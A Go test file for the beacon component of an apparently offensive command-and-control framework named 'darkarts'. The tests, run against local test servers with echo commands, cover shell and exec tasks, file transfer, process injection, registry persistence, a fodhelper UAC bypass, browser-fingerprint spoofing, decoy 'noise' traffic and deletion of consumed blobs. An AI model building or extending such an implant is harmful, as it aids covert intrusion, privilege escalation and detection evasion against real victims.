package beacon

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"darkarts/pkg/crypto"
	"darkarts/pkg/edge"
	"darkarts/pkg/server"
	"darkarts/pkg/store"
	"darkarts/pkg/tasking"
)

func runTask(t *testing.T, taskType string, payload []byte) *tasking.Result {
	t.Helper()
	ex := &Executor{Timeout: 10 * time.Second}
	return ex.Run(context.Background(), &tasking.Task{ID: "t1", SessionID: "s1", Type: taskType, Payload: payload})
}

func TestExecutorShell(t *testing.T) {
	res := runTask(t, "shell", []byte(`{"cmd":"echo darkarts-test"}`))
	if res.Error != "" {
		t.Fatalf("shell error: %s", res.Error)
	}
	if !strings.Contains(string(res.Output), "darkarts-test") {
		t.Fatalf("shell output mismatch: %q", res.Output)
	}
}

func TestExecutorExec(t *testing.T) {
	exe, args := "cmd", "/C echo exec-test"
	if runtime.GOOS != "windows" {
		exe, args = "echo", "exec-test"
	}
	res := runTask(t, "exec", []byte(`{"path":"`+exe+`","args":"`+args+`"}`))
	if res.Error != "" {
		t.Fatalf("exec error: %s", res.Error)
	}
	if !strings.Contains(string(res.Output), "exec-test") {
		t.Fatalf("exec output mismatch: %q", res.Output)
	}
}

func TestExecutorSleep(t *testing.T) {
	res := runTask(t, "sleep", []byte(`{"seconds":7}`))
	if res.Error != "" || string(res.Output) != `{"seconds":7}` {
		t.Fatalf("sleep result mismatch: %+v", res)
	}
}

func TestExecutorDownloadUpload(t *testing.T) {
	dir := t.TempDir()
	src := filepath.Join(dir, "payload.bin")
	data := bytes.Repeat([]byte{0xde, 0xad}, 64)
	if err := os.WriteFile(src, data, 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}
	dlPayload, _ := json.Marshal(map[string]string{"src": src})
	dl := runTask(t, "download", dlPayload)
	if dl.Error != "" || !bytes.Equal(dl.Output, data) {
		t.Fatalf("download mismatch: %s", dl.Error)
	}

	dst := filepath.Join(dir, "out.bin")
	ulPayload, _ := json.Marshal(map[string]string{"dst": dst, "data": base64.StdEncoding.EncodeToString(data)})
	ul := runTask(t, "upload", ulPayload)
	if ul.Error != "" {
		t.Fatalf("upload error: %s", ul.Error)
	}
	got, err := os.ReadFile(dst)
	if err != nil || !bytes.Equal(got, data) {
		t.Fatalf("uploaded file mismatch: %v", err)
	}

	badPayload, _ := json.Marshal(map[string]string{"dst": dst, "data": "not-base64!"})
	bad := runTask(t, "upload", badPayload)
	if bad.Error == "" {
		t.Fatal("upload with invalid base64 must error")
	}
}

func TestExecutorKillAndInject(t *testing.T) {
	k := runTask(t, "kill", nil)
	if string(k.Output) != "kill" || k.Error != "" {
		t.Fatalf("kill mismatch: %+v", k)
	}
	bad := runTask(t, "inject", []byte(`{"data":"!!!","pid":0}`))
	if bad.Error == "" {
		t.Fatal("inject with invalid base64 must error")
	}
	if runtime.GOOS != "windows" {
		i := runTask(t, "inject", []byte(`{"data":"YWE=","pid":0}`))
		if i.Error == "" {
			t.Fatal("inject must report unsupported off windows")
		}
	}
	u := runTask(t, "bogus", nil)
	if u.Error == "" {
		t.Fatal("unknown task must error")
	}
}

func TestExecutorPersistValidation(t *testing.T) {
	res := runTask(t, "persist", []byte(`{"method":"bogus","name":"x"}`))
	if res.Error == "" {
		t.Fatal("persist with bogus method must fail")
	}
	res = runTask(t, "persist", []byte(`{"method":"reg"}`))
	if res.Error == "" {
		t.Fatal("persist without name must fail")
	}
	res = runTask(t, "unpersist", []byte(`{"method":"bogus","name":"x"}`))
	if res.Error == "" {
		t.Fatal("unpersist with bogus method must fail")
	}
}

func TestExecutorUacValidation(t *testing.T) {
	res := runTask(t, "uac", []byte(`{"method":"bogus","cmd":"whoami"}`))
	if res.Error == "" {
		t.Fatal("uac with bogus method must fail")
	}
	res = runTask(t, "uac", []byte(`{"method":"fodhelper"}`))
	if res.Error == "" {
		t.Fatal("uac without cmd or name must fail")
	}
}

func TestExecutorUnknownTask(t *testing.T) {
	res := runTask(t, "nope", nil)
	if res.Error == "" {
		t.Fatal("unknown task type must fail")
	}
}

func TestDefaultPersistCmd(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("windows only")
	}
	cmd, err := defaultPersistCmd()
	if err != nil {
		t.Fatalf("defaultPersistCmd: %v", err)
	}
	if !strings.HasPrefix(cmd, `cmd /c start "" /b "`) || !strings.HasSuffix(cmd, `"`) {
		t.Fatalf("unexpected default persist cmd: %q", cmd)
	}
}

func TestSleepSecondsParsing(t *testing.T) {
	if secs := sleepSecondsFrom(&tasking.Result{Output: []byte(`{"seconds":3}`)}); secs != 3 {
		t.Fatalf("expected 3, got %d", secs)
	}
	if secs := sleepSecondsFrom(&tasking.Result{Output: []byte("garbage")}); secs != 0 {
		t.Fatalf("expected 0, got %d", secs)
	}
}

func TestJitterBounds(t *testing.T) {
	cfg := beaconConfig(t)
	cfg.Sleep = 100 * time.Second
	cfg.Jitter = 0.2
	b, err := New(cfg)
	if err != nil {
		t.Fatalf("new: %v", err)
	}
	for i := 0; i < 200; i++ {
		d := b.nextDelay()
		if d < 80*time.Second || d > 120*time.Second {
			t.Fatalf("jitter out of bounds: %v", d)
		}
	}
}

func TestNewRequiresConfig(t *testing.T) {
	if _, err := New(Config{}); err == nil {
		t.Fatal("New with empty config must fail")
	}
	cfg := beaconConfig(t)
	cfg.SeedHex = "zz"
	if _, err := New(cfg); err == nil {
		t.Fatal("New with bad seed must fail")
	}
}

func TestAsyncE2ELoop(t *testing.T) {
	serverIdent, err := crypto.NewIdentity()
	if err != nil {
		t.Fatalf("server ident: %v", err)
	}
	agentIdent, err := crypto.IdentityFromSeed(bytes.Repeat([]byte{0x77}, 32))
	if err != nil {
		t.Fatalf("agent ident: %v", err)
	}
	sum := sha256.Sum256(agentIdent.Public())
	sid := hex.EncodeToString(sum[:16])

	engine := server.NewEngine(serverIdent)
	engine.Touch(sid, agentIdent.Public())

	st := store.NewFile(t.TempDir())
	edgeSrv := httptest.NewServer(edge.New(st, edge.Options{}).Handler())
	t.Cleanup(edgeSrv.Close)

	pump := server.NewPump(engine, edgeSrv.URL, nil)
	b, err := New(beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, sid))
	if err != nil {
		t.Fatalf("beacon new: %v", err)
	}

	task, err := engine.IssueTask("op-1", sid, "shell", map[string]string{"cmd": "echo async-e2e-ok"}, "op-a")
	if err != nil {
		t.Fatalf("issue: %v", err)
	}

	if err := pump.Pass(context.Background()); err != nil {
		t.Fatalf("pump push: %v", err)
	}
	if err := b.CheckIn(context.Background()); err != nil {
		t.Fatalf("beacon check-in: %v", err)
	}
	if err := pump.Pass(context.Background()); err != nil {
		t.Fatalf("pump pull: %v", err)
	}

	results := engine.Queue().Results()
	if len(results) != 1 {
		t.Fatalf("expected 1 result, got %d", len(results))
	}
	if !strings.Contains(string(results[0].Output), "async-e2e-ok") {
		t.Fatalf("result output mismatch: %q", results[0].Output)
	}
	if results[0].TaskID != task.ID {
		t.Fatalf("result task id mismatch: %s", results[0].TaskID)
	}
	t2, _ := engine.Queue().Task(task.ID)
	if t2.Status != tasking.StatusComplete {
		t.Fatalf("task status: %s", t2.Status)
	}
}

func TestAsyncE2EMultipleTasks(t *testing.T) {
	serverIdent, _ := crypto.NewIdentity()
	agentIdent, _ := crypto.IdentityFromSeed(bytes.Repeat([]byte{0x33}, 32))
	sum := sha256.Sum256(agentIdent.Public())
	sid := hex.EncodeToString(sum[:16])

	engine := server.NewEngine(serverIdent)
	engine.Touch(sid, agentIdent.Public())
	edgeSrv := httptest.NewServer(edge.New(store.NewFile(t.TempDir()), edge.Options{}).Handler())
	t.Cleanup(edgeSrv.Close)
	pump := server.NewPump(engine, edgeSrv.URL, nil)
	b, err := New(beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, sid))
	if err != nil {
		t.Fatalf("beacon new: %v", err)
	}

	for i := 0; i < 3; i++ {
		if _, err := engine.IssueTask("op-1", sid, "shell", map[string]string{"cmd": "echo task-" + strconv.Itoa(i)}, "op-a"); err != nil {
			t.Fatalf("issue %d: %v", i, err)
		}
	}
	pump.Pass(context.Background())
	b.CheckIn(context.Background())
	pump.Pass(context.Background())

	results := engine.Queue().Results()
	if len(results) != 3 {
		t.Fatalf("expected 3 results, got %d", len(results))
	}
	for i, r := range results {
		if !strings.Contains(string(r.Output), "task-"+strconv.Itoa(i)) {
			t.Fatalf("result %d mismatch: %q", i, r.Output)
		}
	}
}

func TestBeaconRejectsTamperedTask(t *testing.T) {
	serverIdent, _ := crypto.NewIdentity()
	agentIdent, _ := crypto.IdentityFromSeed(bytes.Repeat([]byte{0x44}, 32))
	sum := sha256.Sum256(agentIdent.Public())
	sid := hex.EncodeToString(sum[:16])

	engine := server.NewEngine(serverIdent)
	engine.Touch(sid, agentIdent.Public())
	st := store.NewFile(t.TempDir())
	edgeSrv := httptest.NewServer(edge.New(st, edge.Options{}).Handler())
	t.Cleanup(edgeSrv.Close)
	pump := server.NewPump(engine, edgeSrv.URL, nil)
	b, err := New(beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, sid))
	if err != nil {
		t.Fatalf("beacon new: %v", err)
	}

	engine.IssueTask("op-1", sid, "shell", map[string]string{"cmd": "echo legit"}, "op-a")
	pump.Pass(context.Background())

	keys, err := st.List(context.Background(), sid+"/server/")
	if err != nil || len(keys) != 1 {
		t.Fatalf("expected 1 task blob: %v %v", keys, err)
	}
	blob, err := st.Get(context.Background(), keys[0])
	if err != nil {
		t.Fatalf("get blob: %v", err)
	}
	env, err := crypto.UnmarshalEnvelope(blob)
	if err != nil {
		t.Fatalf("unmarshal envelope: %v", err)
	}
	env.Ciphertext[len(env.Ciphertext)-1] ^= 0xff
	tampered, err := env.Marshal()
	if err != nil {
		t.Fatalf("marshal tampered: %v", err)
	}
	if err := st.Put(context.Background(), keys[0], tampered); err != nil {
		t.Fatalf("put tampered: %v", err)
	}

	if err := b.CheckIn(context.Background()); err != nil {
		t.Fatalf("check-in with tampered task must not fail, got %v", err)
	}
	if len(engine.Queue().Results()) != 0 {
		t.Fatal("tampered task must not produce a result")
	}
}

func TestMimicUsesBrowserFingerprint(t *testing.T) {
	serverIdent, _ := crypto.NewIdentity()
	agentIdent, _ := crypto.NewIdentity()
	engine := server.NewEngine(serverIdent)
	var seenUA, seenAccept string
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seenUA = r.Header.Get("User-Agent")
		seenAccept = r.Header.Get("Accept")
		io.Copy(io.Discard, r.Body)
		if r.Method == http.MethodGet {
			fmt.Fprint(w, "[]")
			return
		}
		w.WriteHeader(http.StatusAccepted)
	})
	edgeSrv := httptest.NewServer(handler)
	t.Cleanup(edgeSrv.Close)
	cfg := beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, "")
	cfg.Mimic = true
	b, err := New(cfg)
	if err != nil {
		t.Fatalf("beacon new: %v", err)
	}
	if b.rotator == nil {
		t.Fatal("mimic mode must create a rotator")
	}
	if err := b.CheckIn(context.Background()); err != nil {
		t.Fatalf("check-in: %v", err)
	}
	if !strings.Contains(seenUA, "Mozilla/5.0") || strings.Contains(seenUA, "Go-http-client") {
		t.Fatalf("UA is not a browser fingerprint: %q", seenUA)
	}
	if !strings.Contains(seenAccept, "text/html") {
		t.Fatalf("missing browser Accept header: %q", seenAccept)
	}
	_ = engine
}

func TestMimicPreservesCustomUA(t *testing.T) {
	serverIdent, _ := crypto.NewIdentity()
	agentIdent, _ := crypto.NewIdentity()
	var seenUA string
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seenUA = r.Header.Get("User-Agent")
		io.Copy(io.Discard, r.Body)
		if r.Method == http.MethodGet {
			fmt.Fprint(w, "[]")
			return
		}
		w.WriteHeader(http.StatusAccepted)
	})
	edgeSrv := httptest.NewServer(handler)
	t.Cleanup(edgeSrv.Close)
	cfg := beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, "")
	cfg.Mimic = true
	cfg.UserAgent = "darkarts-custom"
	b, err := New(cfg)
	if err != nil {
		t.Fatalf("beacon new: %v", err)
	}
	if err := b.CheckIn(context.Background()); err != nil {
		t.Fatalf("check-in: %v", err)
	}
	if seenUA != "darkarts-custom" {
		t.Fatalf("custom UA not preserved: %q", seenUA)
	}
}

func TestNoiseFetchUsesBrowserHeaders(t *testing.T) {
	serverIdent, _ := crypto.NewIdentity()
	agentIdent, _ := crypto.NewIdentity()
	var seenUA, seenPath string
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seenUA = r.Header.Get("User-Agent")
		seenPath = r.URL.Path
		w.WriteHeader(http.StatusOK)
	})
	edgeSrv := httptest.NewServer(handler)
	t.Cleanup(edgeSrv.Close)
	cfg := beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, "")
	cfg.Mimic = true
	cfg.Noise = true
	b, err := New(cfg)
	if err != nil {
		t.Fatalf("beacon new: %v", err)
	}
	if err := b.NoiseFetch(context.Background()); err != nil {
		t.Fatalf("noise fetch: %v", err)
	}
	if seenPath != "/" {
		t.Fatalf("noise fetch path %q", seenPath)
	}
	if !strings.Contains(seenUA, "Mozilla/5.0") {
		t.Fatalf("noise fetch UA %q", seenUA)
	}
}

func TestBeaconStateSurvivesRestart(t *testing.T) {
	serverIdent, _ := crypto.NewIdentity()
	agentIdent, _ := crypto.NewIdentity()
	sum := sha256.Sum256(agentIdent.Public())
	sid := hex.EncodeToString(sum[:16])

	statePath := filepath.Join(t.TempDir(), "beacon-state.json")
	engine := server.NewEngine(serverIdent)
	engine.Touch(sid, agentIdent.Public())
	st := store.NewFile(t.TempDir())
	edgeSrv := httptest.NewServer(edge.New(st, edge.Options{}).Handler())
	t.Cleanup(edgeSrv.Close)
	pump := server.NewPump(engine, edgeSrv.URL, nil)

	cfg := beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, sid)
	cfg.StatePath = statePath
	cfg.Runner = &recordingRunner{}
	b1, err := New(cfg)
	if err != nil {
		t.Fatalf("beacon 1: %v", err)
	}
	engine.IssueTask("op-1", sid, "shell", map[string]string{"cmd": "first"}, "op-a")
	pump.Pass(context.Background())
	if err := b1.CheckIn(context.Background()); err != nil {
		t.Fatalf("check-in 1: %v", err)
	}
	pump.Pass(context.Background())
	if len(engine.Queue().Results()) != 1 {
		t.Fatalf("expected 1 result after first check-in, got %d", len(engine.Queue().Results()))
	}

	cfg.Runner = &recordingRunner{}
	b2, err := New(cfg)
	if err != nil {
		t.Fatalf("beacon 2: %v", err)
	}
	if err := b2.CheckIn(context.Background()); err != nil {
		t.Fatalf("check-in 2: %v", err)
	}
	pump.Pass(context.Background())
	if len(engine.Queue().Results()) != 1 {
		t.Fatal("restarted beacon must not re-execute old tasks")
	}
	if r := engine.Queue().Results()[0]; string(r.Output) != `{"ran":["first"]}` {
		t.Fatalf("unexpected output: %q", r.Output)
	}

	engine.IssueTask("op-2", sid, "shell", map[string]string{"cmd": "second"}, "op-a")
	pump.Pass(context.Background())
	if err := b2.CheckIn(context.Background()); err != nil {
		t.Fatalf("check-in 3: %v", err)
	}
	pump.Pass(context.Background())
	if len(engine.Queue().Results()) != 2 {
		t.Fatalf("expected 2 results after new task, got %d", len(engine.Queue().Results()))
	}
}

func TestCheckInDeletesConsumedBlobs(t *testing.T) {
	serverIdent, _ := crypto.NewIdentity()
	agentIdent, _ := crypto.NewIdentity()
	sum := sha256.Sum256(agentIdent.Public())
	sid := hex.EncodeToString(sum[:16])

	st := store.NewFile(t.TempDir())
	edgeSrv := httptest.NewServer(edge.New(st, edge.Options{}).Handler())
	t.Cleanup(edgeSrv.Close)
	engine := server.NewEngine(serverIdent)
	engine.Touch(sid, agentIdent.Public())
	pump := server.NewPump(engine, edgeSrv.URL, nil)

	cfg := beaconConfigWith(t, serverIdent, agentIdent, edgeSrv.URL, sid)
	cfg.Runner = &recordingRunner{}
	b, err := New(cfg)
	if err != nil {
		t.Fatalf("beacon new: %v", err)
	}

	engine.IssueTask("op-1", sid, "shell", map[string]string{"cmd": "first"}, "op-a")
	pump.Pass(context.Background())
	if err := b.CheckIn(context.Background()); err != nil {
		t.Fatalf("check-in: %v", err)
	}
	pump.Pass(context.Background())

	if len(engine.Queue().Results()) != 1 {
		t.Fatalf("expected 1 result, got %d", len(engine.Queue().Results()))
	}
	if keys, _ := st.List(context.Background(), sid+"/server/"); len(keys) != 0 {
		t.Fatalf("consumed task blobs not deleted: %v", keys)
	}
	if keys, _ := st.List(context.Background(), sid+"/beacon/"); len(keys) != 0 {
		t.Fatalf("consumed result blobs not deleted: %v", keys)
	}

	cfg.Runner = &recordingRunner{}
	b2, err := New(cfg)
	if err != nil {
		t.Fatalf("beacon 2: %v", err)
	}
	if err := b2.CheckIn(context.Background()); err != nil {
		t.Fatalf("fresh check-in: %v", err)
	}
	if len(engine.Queue().Results()) != 1 {
		t.Fatal("fresh beacon without state must not re-execute deleted tasks")
	}
}

type recordingRunner struct {
	mu  sync.Mutex
	ran []string
}

func (r *recordingRunner) Run(ctx context.Context, t *tasking.Task) *tasking.Result {
	r.mu.Lock()
	defer r.mu.Unlock()
	var params map[string]string
	json.Unmarshal(t.Payload, &params)
	r.ran = append(r.ran, params["cmd"])
	out, _ := json.Marshal(map[string]any{"ran": r.ran})
	return &tasking.Result{TaskID: t.ID, SessionID: t.SessionID, Output: out}
}

func beaconConfig(t *testing.T) Config {
	t.Helper()
	agentIdent, err := crypto.NewIdentity()
	if err != nil {
		t.Fatalf("agent ident: %v", err)
	}
	serverIdent, err := crypto.NewIdentity()
	if err != nil {
		t.Fatalf("server ident: %v", err)
	}
	return beaconConfigWith(t, serverIdent, agentIdent, "http://127.0.0.1:1", "")
}

func beaconConfigWith(t *testing.T, serverIdent, agentIdent *crypto.Identity, edgeURL, sid string) Config {
	t.Helper()
	return Config{
		SeedHex:   hex.EncodeToString(agentIdent.PrivateSeed()),
		ServerPub: serverIdent.Public(),
		EdgeURL:   edgeURL,
		SID:       sid,
		Sleep:     1 * time.Second,
		Jitter:    0,
	}
}

func TestParseEdges(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"http://a:1", []string{"http://a:1"}},
		{"a,b", []string{"http://a", "http://b"}},
		{" http://x/ ,, y:7443,", []string{"http://x", "http://y:7443"}},
		{"https://tun.example.com,http://lan:7443", []string{"https://tun.example.com", "http://lan:7443"}},
		{"", nil},
		{"  ", nil},
	}
	for _, c := range cases {
		got := parseEdges(c.in)
		if len(got) != len(c.want) {
			t.Errorf("parseEdges(%q) = %v, want %v", c.in, got, c.want)
			continue
		}
		for i := range got {
			if got[i] != c.want[i] {
				t.Errorf("parseEdges(%q) = %v, want %v", c.in, got, c.want)
				break
			}
		}
	}
}

func TestProbeEdgeRequiresHealthyStatus(t *testing.T) {
	bad := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "bad gateway", http.StatusBadGateway)
	}))
	defer bad.Close()
	good := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer good.Close()
	noHealthz := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	}))
	defer noHealthz.Close()

	b := &Beacon{client: &http.Client{Timeout: 5 * time.Second}}
	if b.probeEdge(context.Background(), bad.URL) {
		t.Fatal("502 /healthz must not count as a usable edge")
	}
	if b.probeEdge(context.Background(), noHealthz.URL) {
		t.Fatal("404 /healthz must not count as a usable edge")
	}
	if !b.probeEdge(context.Background(), good.URL) {
		t.Fatal("200 /healthz must count as a usable edge")
	}
}
